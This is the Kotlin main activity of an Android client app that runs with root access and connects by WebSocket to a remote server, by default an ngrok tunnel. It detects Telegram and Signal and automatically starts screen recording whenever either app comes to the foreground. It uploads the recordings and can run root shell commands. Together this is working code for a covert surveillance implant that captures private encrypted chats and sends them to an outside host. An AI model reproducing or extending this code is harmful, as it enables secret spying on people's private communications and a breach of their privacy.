package com.rdm.client

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.KeyEvent
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.CompoundButton
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.google.android.material.materialswitch.MaterialSwitch
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import org.json.JSONObject
import android.provider.Settings
import android.content.SharedPreferences

class MainActivity : AppCompatActivity() {
    private lateinit var tvStatus: TextView
    private lateinit var tvDeviceInfoHint: TextView
    private lateinit var tvRecordingStatus: TextView
    private lateinit var btnConnect: Button
    private lateinit var btnDisconnect: Button
    private lateinit var btnTestCommand: Button
    private lateinit var etServerUrl: EditText
    private lateinit var switchAppendDeviceId: MaterialSwitch
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var systemAppHelper: SystemAppHelper

    // Telegram/Signal detection UI elements
    private lateinit var tvTelegramStatus: TextView
    private lateinit var tvTelegramRecording: TextView
    private lateinit var tvSignalStatus: TextView
    private lateinit var tvSignalRecording: TextView

    private lateinit var webSocketClient: WebSocketClient
    private lateinit var deviceId: String
    private var isServiceRunning = false
    private lateinit var rootExecutor: RootExecutor
    private lateinit var foregroundAppMonitor: ForegroundAppMonitor
    private lateinit var appDetector: AppDetector
    private lateinit var recordingManager: RecordingManager

    private val TAG = "MainActivity"
    private var isAutoConnecting = false
    private var shouldAutoReconnect = true
    private var lastServiceStartTime = 0L

    // Network monitoring
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var networkCallback: ConnectivityManager.NetworkCallback
    private var isNetworkAvailable = false

    // Broadcast receiver for connection status updates from RdmService
    private val connectionStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == RdmService.ACTION_CONNECTION_STATUS_CHANGED) {
                val isConnected = intent.getBooleanExtra(RdmService.EXTRA_IS_CONNECTED, false)
                updateConnectionStatusUI(isConnected)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Get device ID
        deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        // Initialize shared preferences
        sharedPreferences = getSharedPreferences("RdmClient", Context.MODE_PRIVATE)

        // Initialize system app helper
        systemAppHelper = SystemAppHelper(this)

        // Initialize views
        tvStatus = findViewById(R.id.tvStatus)
        tvDeviceInfoHint = findViewById(R.id.tvDeviceInfoHint)
        tvRecordingStatus = findViewById(R.id.tvRecordingStatus)
        btnConnect = findViewById(R.id.btnConnect)
        btnDisconnect = findViewById(R.id.btnDisconnect)
        btnTestCommand = findViewById(R.id.btnTestCommand)
        etServerUrl = findViewById(R.id.etServerUrl)
        switchAppendDeviceId = findViewById(R.id.switchAppendDeviceId)

        // Initialize Telegram/Signal detection UI elements
        tvTelegramStatus = findViewById(R.id.tvTelegramStatus)
        tvTelegramRecording = findViewById(R.id.tvTelegramRecording)
        tvSignalStatus = findViewById(R.id.tvSignalStatus)
        tvSignalRecording = findViewById(R.id.tvSignalRecording)

        // Set device ID hint
        tvDeviceInfoHint.text = "Device ID: $deviceId"

        // Load saved server URL
        val savedUrl = sharedPreferences.getString("server_url", "wss://separately-touched-manatee.ngrok-free.app")
        etServerUrl.setText(savedUrl)

        // Initialize WebSocket client (will be replaced on connect)
        webSocketClient = WebSocketClient(this, "ws://placeholder:8443/ws/device/$deviceId", deviceId)

        // Initialize root executor
        rootExecutor = RootExecutor()

        // Initialize recording manager
        recordingManager = RecordingManager(this)

        // Initialize app detector for Telegram/Signal
        appDetector = AppDetector(this)

        // Initialize foreground app monitor with recording callbacks
        foregroundAppMonitor = ForegroundAppMonitor(
            context = this,
            rootExecutor = rootExecutor,
            webSocketClient = webSocketClient,
            onRecordingTrigger = { packageName -> startScreenRecording(packageName) },
            onRecordingStop = { stopScreenRecording() },
            onAppChanged = { packageName -> updateRecordingIndicators(packageName) }
        )

        // Set up network monitoring
        setupNetworkMonitoring()

        // Set up listeners
        setupButtonListeners()
        setupTextWatchers()

        // Register broadcast receiver for connection status updates (global broadcast)
        val filter = IntentFilter(RdmService.ACTION_CONNECTION_STATUS_CHANGED)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(connectionStatusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(connectionStatusReceiver, filter)
        }

        Log.d(TAG, "MainActivity created. Device ID: $deviceId")

        // Check system configuration (async)
        lifecycleScope.launch {
            systemAppHelper.printDiagnostics()
            checkSystemConfiguration()
        }

        // Start app detection immediately (independent of server connection)
        lifecycleScope.launch {
            Log.d(TAG, "Starting automatic app detection...")
            detectApps()
        }

        // Start foreground monitoring immediately (independent of server connection)
        lifecycleScope.launch {
            Log.d(TAG, "Starting foreground app monitor...")
            foregroundAppMonitor.start()
        }

        // Set up network monitoring
        setupNetworkMonitoring()

        // Start RdmService immediately for comprehensive monitoring
        val serverUrl = etServerUrl.text.toString().trim()
        if (serverUrl.isNotEmpty()) {
            // Construct WebSocket URL with device ID
            val baseUrl = if (serverUrl.endsWith("/")) {
                serverUrl.dropLast(1)
            } else {
                serverUrl
            }
            val wsUrl = "$baseUrl/ws/device/$deviceId"
            startRdmService(wsUrl)
        }

        // Don't create duplicate WebSocket connection - RdmService handles it
        // Just update UI to show connection status
        lifecycleScope.launch {
            delay(2000) // Wait for RdmService to connect
            Log.d(TAG, "RdmService is handling WebSocket connection")
        }
    }

    private suspend fun checkSystemConfiguration() {
        delay(2000) // Wait 2 seconds before checking

        val status = systemAppHelper.checkPermissions()
        val issues = status.getIssues()

        if (issues.isNotEmpty()) {
            Log.w(TAG, "System configuration issues: ${issues.joinToString(", ")}")

            // Request to disable battery optimizations if needed
            if (!status.batteryOptimizationsDisabled) {
                Log.d(TAG, "Requesting to disable battery optimizations")
                systemAppHelper.requestDisableBatteryOptimizations()
            }

            // Show system info in recording status temporarily
            val systemInfo = systemAppHelper.getSystemInfo()
            tvRecordingStatus.text = systemInfo
            tvRecordingStatus.setTextColor(getColor(R.color.text_secondary))

            // If no root access, show warning
            if (!status.hasRootAccess) {
                Toast.makeText(
                    this@MainActivity,
                    "Warning: No root access detected. Some features may not work.",
                    Toast.LENGTH_LONG
                ).show()
            }
        } else {
            Log.d(TAG, "System configuration OK - fully configured as system app with root access")
            tvRecordingStatus.text = "System: Fully configured ✓"
            tvRecordingStatus.setTextColor(getColor(R.color.status_connected))
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        shouldAutoReconnect = false
        foregroundAppMonitor.stop()
        disconnectFromServer()
        unregisterNetworkCallback()

        // Unregister broadcast receiver
        try {
            unregisterReceiver(connectionStatusReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering connection status receiver", e)
        }

        Log.d(TAG, "MainActivity destroyed")
    }

    private fun setupNetworkMonitoring() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                Log.d(TAG, "Network available")
                isNetworkAvailable = true

                // Trigger upload of pending recordings
                Log.d(TAG, "Triggering pending recording uploads")
                recordingManager.onConnectionRestored()

                // Auto-reconnect when network becomes available
                if (shouldAutoReconnect) {
                    lifecycleScope.launch {
                        delay(2000) // Wait 2 seconds before reconnecting
                        if (shouldAutoReconnect) {
                            Log.d(TAG, "Auto-reconnecting RdmService due to network availability")
                            // Trigger RdmService reconnection by restarting it
                            val serverUrl = etServerUrl.text.toString().trim()
                            if (serverUrl.isNotEmpty()) {
                                val baseUrl = if (serverUrl.endsWith("/")) {
                                    serverUrl.dropLast(1)
                                } else {
                                    serverUrl
                                }
                                val wsUrl = "$baseUrl/ws/device/$deviceId"
                                startRdmService(wsUrl)
                            }
                        }
                    }
                }
            }

            override fun onLost(network: Network) {
                super.onLost(network)
                Log.d(TAG, "Network lost")
                isNetworkAvailable = false

                runOnUiThread {
                    tvStatus.text = "● No Internet"
                    tvStatus.setTextColor(getColor(R.color.status_disconnected))
                }
            }

            override fun onCapabilitiesChanged(
                network: Network,
                networkCapabilities: NetworkCapabilities
            ) {
                super.onCapabilitiesChanged(network, networkCapabilities)
                isNetworkAvailable = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                Log.d(TAG, "Network capabilities changed. Internet available: $isNetworkAvailable")
            }
        }

        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            connectivityManager.registerDefaultNetworkCallback(networkCallback)
        } else {
            connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
        }

        // Check initial network state
        val activeNetwork = connectivityManager.activeNetworkInfo
        isNetworkAvailable = activeNetwork?.isConnected == true
        Log.d(TAG, "Initial network state: $isNetworkAvailable")
    }

    private fun unregisterNetworkCallback() {
        try {
            connectivityManager.unregisterNetworkCallback(networkCallback)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering network callback", e)
        }
    }

    private fun setupButtonListeners() {
        btnConnect.setOnClickListener {
            Log.d(TAG, "Manual reconnect - restarting RdmService")
            // Stop and restart RdmService with new URL
            try {
                val intent = Intent(this, RdmService::class.java).apply {
                    action = RdmService.ACTION_STOP
                }
                startService(intent)

                val serverUrl = etServerUrl.text.toString().trim()
                if (serverUrl.isNotEmpty()) {
                    val baseUrl = if (serverUrl.endsWith("/")) {
                        serverUrl.dropLast(1)
                    } else {
                        serverUrl
                    }
                    val wsUrl = "$baseUrl/ws/device/$deviceId"
                    val startIntent = Intent(this, RdmService::class.java).apply {
                        action = RdmService.ACTION_START
                        putExtra(RdmService.EXTRA_SERVER_URL, wsUrl)
                    }
                    startForegroundService(startIntent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to reconnect", e)
            }
        }

        btnDisconnect.setOnClickListener {
            Log.d(TAG, "Disconnect button clicked - stopping RdmService")
            shouldAutoReconnect = false
            try {
                val intent = Intent(this, RdmService::class.java).apply {
                    action = RdmService.ACTION_STOP
                }
                startService(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to stop service", e)
            }
        }

        btnTestCommand.setOnClickListener {
            testCommand()
        }

        switchAppendDeviceId.setOnCheckedChangeListener { _, isChecked ->
            Log.d(TAG, "Append device ID: $isChecked")
        }
    }

    private fun setupTextWatchers() {
        etServerUrl.setOnEditorActionListener { _, actionId, event ->
            if (actionId == EditorInfo.IME_ACTION_DONE ||
                (event != null && event.keyCode == KeyEvent.KEYCODE_ENTER)) {
                isAutoConnecting = false
                connectToServer()
                true
            } else {
                false
            }
        }

        etServerUrl.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                // Save URL for auto-reconnect
                sharedPreferences.edit().putString("server_url", s.toString()).apply()
            }
        })
    }

    // NOTE: WebSocket connection is now handled entirely by RdmService
    // MainActivity only manages the UI and service lifecycle
    private fun connectToServer() {
        // This method is kept for compatibility but delegates to RdmService
        val serverUrl = etServerUrl.text.toString().trim()
        if (serverUrl.isNotEmpty()) {
            val baseUrl = if (serverUrl.endsWith("/")) {
                serverUrl.dropLast(1)
            } else {
                serverUrl
            }
            val wsUrl = "$baseUrl/ws/device/$deviceId"
            startRdmService(wsUrl)
        }
    }

    private fun startRdmService(serverUrl: String) {
        try {
            // Prevent rapid repeated service starts (within 2 seconds)
            val now = System.currentTimeMillis()
            if (now - lastServiceStartTime < 2000) {
                Log.d(TAG, "Ignoring rapid RdmService start request")
                return
            }
            lastServiceStartTime = now

            val intent = Intent(this, RdmService::class.java).apply {
                action = RdmService.ACTION_START
                putExtra(RdmService.EXTRA_SERVER_URL, serverUrl)
            }
            startForegroundService(intent)
            Log.d(TAG, "RdmService started with URL: $serverUrl")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start RdmService", e)
        }
    }

    private fun sendInitialDeviceInfo() {
        lifecycleScope.launch {
            try {
                detectApps() // Always detect apps when connected
            } catch (e: Exception) {
                Log.e(TAG, "Error sending initial device info", e)
            }
        }
    }

    private fun disconnectFromServer() {
        try {
            // Stop RdmService
            val intent = Intent(this, RdmService::class.java).apply {
                action = RdmService.ACTION_STOP
            }
            startService(intent)
            Log.d(TAG, "RdmService stopped")

            btnConnect.isEnabled = true
            btnDisconnect.isEnabled = false
            etServerUrl.isEnabled = true
            switchAppendDeviceId.isEnabled = true

            tvStatus.text = "● Offline"
            tvStatus.setTextColor(getColor(R.color.status_disconnected))

            Toast.makeText(this, "Disconnected from server", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disconnect", e)
        }
    }

    private fun detectApps() {
        Log.d(TAG, "detectApps() called - running automatic app detection")
        lifecycleScope.launch {
            val detectedResult = appDetector.detectApps()

            if (detectedResult.isSuccess) {
                val detectedApps = detectedResult.getOrNull() ?: emptyMap()

                // Update Telegram UI
                val telegramApp = detectedApps["Telegram"]
                if (telegramApp != null && telegramApp.isInstalled) {
                    tvTelegramStatus.text = "✓ Detected"
                    tvTelegramStatus.setTextColor(getColor(R.color.status_connected))
                } else {
                    tvTelegramStatus.text = "Not detected"
                    tvTelegramStatus.setTextColor(getColor(R.color.text_secondary))
                }

                // Update Signal UI
                val signalApp = detectedApps["Signal"]
                if (signalApp != null && signalApp.isInstalled) {
                    tvSignalStatus.text = "✓ Detected"
                    tvSignalStatus.setTextColor(getColor(R.color.status_connected))
                } else {
                    tvSignalStatus.text = "Not detected"
                    tvSignalStatus.setTextColor(getColor(R.color.text_secondary))
                }

                val detectedCount = detectedApps.values.count { it.isInstalled }
                Log.d(TAG, "Apps detected automatically: $detectedCount")

                // Only show toast if it's a manual detection (not auto)
                if (!isAutoConnecting) {
                    Toast.makeText(this@MainActivity, "$detectedCount app(s) detected", Toast.LENGTH_SHORT).show()
                }
            } else {
                Log.e(TAG, "App detection failed: ${detectedResult.exceptionOrNull()?.message}")
            }
        }
    }

    private fun startScreenRecording(packageName: String) {
        if (isServiceRunning) {
            Log.w(TAG, "Recording service already running")
            return
        }

        lifecycleScope.launch {
            try {
                val intent = Intent(this@MainActivity, ScreenRecordService::class.java).apply {
                    action = ScreenRecordService.ACTION_START
                    putExtra(ScreenRecordService.EXTRA_APP_PACKAGE, packageName)
                }
                startForegroundService(intent)

                isServiceRunning = true

                val appName = appDetector.getAppName(packageName) ?: packageName
                updateRecordingIndicators(packageName)
                tvRecordingStatus.text = "Recording: $appName"
                tvRecordingStatus.setTextColor(getColor(R.color.status_recording))

                Toast.makeText(this@MainActivity, "Recording started for $appName", Toast.LENGTH_SHORT).show()
                Log.d(TAG, "Screen recording service started")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start screen recording", e)
                Toast.makeText(this@MainActivity, "Failed to start recording: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun stopScreenRecording() {
        if (!isServiceRunning) {
            return
        }

        try {
            val intent = Intent(this, ScreenRecordService::class.java).apply {
                action = ScreenRecordService.ACTION_STOP
            }
            startService(intent)

            isServiceRunning = false
            tvRecordingStatus.text = "Ready to monitor"
            tvRecordingStatus.setTextColor(getColor(R.color.text_secondary))

            // Clear recording indicators
            updateRecordingIndicators(null)

            Log.d(TAG, "Stopped screen recording")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop screen recording", e)
        }
    }

    private fun updateRecordingIndicators(packageName: String?) {
        val isRecording = isServiceRunning

        // Check if Telegram
        if (packageName != null && packageName.contains("telegram", ignoreCase = true)) {
            if (isRecording) {
                tvTelegramRecording.text = "●"
                tvTelegramRecording.setTextColor(getColor(R.color.status_recording))
            } else {
                // Telegram is foreground but not recording (permission denied or error)
                tvTelegramRecording.text = "!"
                tvTelegramRecording.setTextColor(getColor(R.color.status_connecting))
            }
        } else {
            // Telegram is not foreground
            tvTelegramRecording.text = "○"
            tvTelegramRecording.setTextColor(getColor(R.color.status_disconnected_dim))
        }

        // Check if Signal
        if (packageName != null && (packageName.contains("thoughtcrime", ignoreCase = true) ||
                                     packageName.contains("signal", ignoreCase = true))) {
            if (isRecording) {
                tvSignalRecording.text = "●"
                tvSignalRecording.setTextColor(getColor(R.color.status_recording))
            } else {
                // Signal is foreground but not recording
                tvSignalRecording.text = "!"
                tvSignalRecording.setTextColor(getColor(R.color.status_connecting))
            }
        } else {
            // Signal is not foreground
            tvSignalRecording.text = "○"
            tvSignalRecording.setTextColor(getColor(R.color.status_disconnected_dim))
        }
    }

    private fun updateConnectionStatusUI(isConnected: Boolean) {
        runOnUiThread {
            if (isConnected) {
                tvStatus.text = "● Online"
                tvStatus.setTextColor(getColor(R.color.status_connected))
                btnConnect.isEnabled = false
                btnDisconnect.isEnabled = true
                etServerUrl.isEnabled = false
                switchAppendDeviceId.isEnabled = false
                Log.d(TAG, "UI updated: Connected")
            } else {
                tvStatus.text = "● Offline"
                tvStatus.setTextColor(getColor(R.color.status_disconnected))
                btnConnect.isEnabled = true
                btnDisconnect.isEnabled = false
                etServerUrl.isEnabled = true
                switchAppendDeviceId.isEnabled = true
                Log.d(TAG, "UI updated: Disconnected")
            }
        }
    }

    private fun testCommand() {
        lifecycleScope.launch {
            try {
                Log.d(TAG, "Executing test command...")
                val result = rootExecutor.execute("ls -la /system/app")

                if (result.success) {
                    Toast.makeText(this@MainActivity, "Command executed successfully", Toast.LENGTH_SHORT).show()
                    Log.d(TAG, "Test command result: SUCCESS")
                } else {
                    Toast.makeText(this@MainActivity, "Command failed: ${result.error}", Toast.LENGTH_LONG).show()
                    Log.d(TAG, "Test command result: FAILED - ${result.error}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Test command failed", e)
                Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}